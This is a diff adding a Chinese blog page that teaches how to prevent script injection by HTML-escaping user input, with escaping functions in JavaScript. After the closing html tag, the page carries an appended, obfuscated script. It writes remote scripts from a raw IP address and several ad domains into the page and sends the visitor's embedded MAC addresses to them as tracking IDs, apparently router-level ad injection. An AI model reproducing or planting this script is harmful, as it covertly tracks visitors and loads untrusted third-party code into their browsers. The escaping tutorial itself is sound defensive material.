@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>脚本注入--html转码</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="http://www.newhuan.name/css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="http://www.newhuan.name/blog" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">脚本注入--html转码</h1>
+                <h3 class="date">20180119</h3>
+                <div class="clearfix typo">
+                    <p>如果将用户输入内容简单拼接到html字符串中并添加到页面元素内,此时如果用户输入的是html文本,那么用户输入的html文本就会作为页面元素添加到页面内</p>
+                    <p>如: 用户输入"&lt;script&gt;alert(1);&lt;/script&gt;", 此时如果使用拼接字符串的方式渲染页面,那么改字符串就会被渲染成一个script标签并添加到页面中,同时弹出"1";如果此时其他用户也查看了这条数据,那么在其他用户的页面内也会渲染出该script标签,完成一次脚本注入.</p>
+                    <p>一部分脚本注入攻击就是藉由这种漏洞实现的.为了防止此类情况,需要将此类用户输入内容先进行转码再添加到页面中,以下为对应的转码关系:</p>
+             <pre>
+                 <code>
+                     {
+                        '<': '&amp;lt;',
+                        '>': '&amp;gt;',
+                        '&': '&amp;amp;',
+                        ' ': '&amp;nbsp;',
+                        '"': '&amp;quot;',
+                        "'": '&amp;#39;',
+                        '\n': '&lt;br/&gt;',
+                        '\r': ''
+                     }
+                 </code>
+             </pre>
+                    <p>同时附上转码方法:</p>
+                    <pre>
+                        <code>
+var _$encode = function (_map, _content) {
+    _content = '' + _content;
+    if (!_map || !_content) {
+        return _content || '';
+    }
+    return _content.replace(_map.r, function ($1) {
+        var _result = _map[!_map.i ? $1.toLowerCase() : $1];
+        return _result != null ? _result : $1;
+    });
+};
+var _$escape = (function () {
+    var _reg = /&lt;br\/?&gt;$/,
+        _map = {
+            r: /\<|\>|\&|\r|\n|\s|\'|\"/g,
+            '<': '&amp;lt;',
+            '>': '&amp;gt;',
+            '&': '&amp;amp;',
+            ' ': '&amp;nbsp;',
+            '"': '&amp;quot;',
+            "'": '&amp;#39;',
+            '\n': '&lt;br/&gt;',
+            '\r': ''
+        };
+    return function (_content) {
+        _content = _$encode(_map, _content);
+        return _content.replace(_reg, '&lt;br/&gt;&lt;br/&gt;');
+    };
+})();
+//另副逆转码方法
+var _$unescape = (function ( a ) {
+    var _reg = /&lt;br\/?&gt;&lt;br\/?&gt;$/,
+        _map = {
+            r: /&amp;lt;|&amp;gt;|&amp;amp;|&amp;nbsp;|&amp;quot;|&amp;#39;|&lt;br\/&gt;|&lt;br&gt;/g,
+            '&amp;lt;': "<",
+            '&amp;gt;': ">",
+            '&amp;amp;': "&",
+            '&amp;nbsp;': " ",
+            '&amp;quot;': '"',
+            '&amp;#39;': "'",
+            '&lt;br/&gt;': "\n",
+            '&lt;br&gt;': "\n",
+        }
+        return function ( _content ) {
+            _content = _$encode( _map, _content );
+            return _content.replace( _reg, "&lt;br/&gt;" );
+        }
+    })();
+                        </code>
+                    </pre>
+                    <p>同时如果只是简单的转码,那么也会出现问题,比如说在修改用户名称的时候,显示html名称的地方需要被转码,但是如果是在编辑用户名称的输入框内,显示的则必须是转码前的内容,此时就涉及到text和html的不同</p>
+                    <p>jQuery中的 <code>text()</code>和<code>html()</code>两个方法,一个返回的是元素内的文本内容,一个返回元素包含的html代码,分别对应原生js的textContent和innerHTML两个属性(根据元素的nodeType有所不同)</p>
+                    <p>两者的区别简单来说就是,你看到的文字内容和形式就是textContent的值,页面内真实被元素包含的html内容就是innerHTML的值.html(显示的用户名称)和value(输入框的内容)之间的转换可以简单视为text()方法和val()方法的转换,html的text()转换为val()的值,val()的值转换为html的text(),如此可以保证html和value的正确转换.</p>
+                    <p>另一种不用另外写方法的转码方式可以考虑创建一个元素,将用户输入内容作为其textContent,然后输出其innerHTML,此时其innerHTML就是被转码后的字符串,可以被安全的拼接到html字符串中.只是此种方法和直接转义字符串的效率差了两个数量级,推荐使用前一种方法.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.name/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
+<script>
+    var _$encode = function (_map, _content) {
+        _content = '' + _content;
+        if (!_map || !_content) {
+            return _content || '';
+        }
+        return _content.replace(_map.r, function ($1) {
+            var _result = _map[!_map.i ? $1.toLowerCase() : $1];
+            return _result != null ? _result : $1;
+        });
+    };
+    var _$escape = (function () {
+        var _reg = /<br\/?>$/,
+            _map = {
+                r: /\<|\>|\&|\r|\n|\s|\'|\"/g,
+                '<': '&lt;',
+                '>': '&gt;',
+                '&': '&amp;',
+                ' ': '&nbsp;',
+                '"': '&quot;',
+                "'": '&#39;',
+                '\n': '<br/>',
+                '\r': ''
+            };
+        return function (_content) {
+            _content = _$encode(_map, _content);
+            return _content.replace(_reg, '<br/><br/>');
+        };
+    })();
+
+    var _$unescape = (function ( a ) {
+        // var _reg = /&lt;br\/?&gt;&lt;br\/?&gt;$/,
+        var _reg = /<br\/?><br\/?>$/,
+            _map = {
+                r: /&lt;|&gt;|&amp;|&nbsp;|&quot;|&#39;|<br\/>|<br>/g,
+                '&lt;': "<",
+                '&gt;': ">",
+                '&amp;': "&",
+                '&nbsp;': " ",
+                '&quot;': '"',
+                '&#39;': "'",
+                '<br/>': "\n",
+                '<br>': "\n",
+            }
+            return function ( _content ) {
+                _content = _$encode( _map, _content );
+                return _content.replace( _reg, "<br/>" );
+            }
+        })();
+</script>
